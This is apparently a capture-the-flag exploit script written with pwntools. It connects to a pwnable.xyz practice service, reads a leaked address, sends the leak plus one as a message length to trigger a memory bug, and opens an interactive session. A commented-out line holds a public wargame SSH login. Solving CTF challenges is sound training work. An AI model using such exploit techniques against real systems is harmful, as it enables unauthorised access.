#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

# con = process()
#gdb.attach(con, gdbscript = "start")

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("svc.pwnable.xyz", 30000)

con.recvuntil(b"Leak: ")
leak = int(con.recvline().decode().strip("\n"), 16)
log.info(hex(leak))

con.sendlineafter(b"Length of your message: ", str(leak+1))
con.sendlineafter(b"Enter your message: ", b"a")

con.interactive()
